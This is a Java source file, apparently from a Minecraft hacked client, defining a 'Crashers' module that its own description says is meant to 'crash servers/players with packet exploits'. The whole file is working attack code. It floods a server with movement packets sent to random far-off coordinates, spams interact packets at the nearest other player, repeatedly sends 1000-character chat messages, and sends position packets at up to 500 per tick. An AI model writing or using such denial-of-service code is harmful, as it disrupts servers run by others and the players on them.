package nv.navineclient.module.misc;

import net.minecraft.network.protocol.game.ServerboundInteractPacket;
import net.minecraft.network.protocol.game.ServerboundMovePlayerPacket;
import net.minecraft.world.entity.player.Player;
import nv.navineclient.module.Module;
import nv.navineclient.module.settings.ModeSetting;
import nv.navineclient.module.settings.NumberSetting;
import nv.navineclient.util.ChatUtils;

public class Crashers extends Module {
    private final ModeSetting mode = new ModeSetting("Mode", "Crash method", "Position", "Position", "Entity", "Chat", "PacketSpam");
    private final NumberSetting intensity = new NumberSetting("Intensity", "Packets per tick", 50.0, 10.0, 500.0);
    private final NumberSetting targetX = new NumberSetting("TargetX", "Target X coordinate", 0.0, -30000000.0, 30000000.0);
    private final NumberSetting targetY = new NumberSetting("TargetY", "Target Y coordinate", 0.0, -30000000.0, 30000000.0);
    private final NumberSetting targetZ = new NumberSetting("TargetZ", "Target Z coordinate", 0.0, -30000000.0, 30000000.0);

    public Crashers() {
        super("Crashers", "Crash servers/players with packet exploits", Category.MISC);
        addSetting(mode);
        addSetting(intensity);
        addSetting(targetX);
        addSetting(targetY);
        addSetting(targetZ);
    }

    @Override
    public void onTick() {
        if (mc.player == null || mc.getConnection() == null) {
            if (isEnabled()) {
                setEnabled(false);
            }
            return;
        }

        String m = mode.getValue();
        int packets = Math.max(1, intensity.getValue().intValue() / 2);

        if (m.equals("Position")) {
            crashPosition(packets);
        } else if (m.equals("Entity")) {
            crashEntity(packets);
        } else if (m.equals("Chat")) {
            crashChat(packets);
        } else if (m.equals("PacketSpam")) {
            crashPacketSpam(packets);
        }
    }

    private void crashPosition(int packets) {
        double x = targetX.getValue();
        double y = targetY.getValue();
        double z = targetZ.getValue();

        for (int i = 0; i < packets; i++) {
            double offsetX = x + (Math.random() * 1000000 - 500000);
            double offsetY = y + (Math.random() * 1000 - 500);
            double offsetZ = z + (Math.random() * 1000000 - 500000);
            mc.getConnection().send(new ServerboundMovePlayerPacket.PosRot(
                    offsetX, offsetY, offsetZ, mc.player.getYRot(), mc.player.getXRot(), false, true));
        }
    }

    private void crashEntity(int packets) {
        if (mc.level == null) {
            return;
        }

        Player target = null;
        double bestDistance = Double.MAX_VALUE;
        for (Player player : mc.level.players()) {
            if (player == mc.player) {
                continue;
            }
            double distance = mc.player.distanceToSqr(player);
            if (distance < bestDistance) {
                bestDistance = distance;
                target = player;
            }
        }
        if (target == null) {
            return;
        }

        for (int i = 0; i < packets; i++) {
            mc.getConnection().send(new ServerboundInteractPacket(
                    target.getId(), net.minecraft.world.InteractionHand.MAIN_HAND, target.position(), mc.player.isShiftKeyDown()));
        }
    }

    private void crashChat(int packets) {
        StringBuilder sb = new StringBuilder();
        for (int i = 0; i < 1000; i++) {
            sb.append("A");
        }
        String longMessage = sb.toString();

        for (int i = 0; i < packets; i++) {
            mc.getConnection().sendChat(longMessage + i);
        }
    }

    private void crashPacketSpam(int packets) {
        double x = targetX.getValue();
        double y = targetY.getValue();
        double z = targetZ.getValue();

        for (int i = 0; i < packets; i++) {
            double offset = (Math.random() * 0.1 - 0.05);
            mc.getConnection().send(new ServerboundMovePlayerPacket.PosRot(
                    x + offset, y + offset, z + offset, mc.player.getYRot(), mc.player.getXRot(), false, true));
        }
    }

    @Override
    public void onEnable() {
        ChatUtils.message("§cCrashers enabled");
    }

    @Override
    public void onDisable() {
        ChatUtils.message("§7Crashers disabled");
    }
}
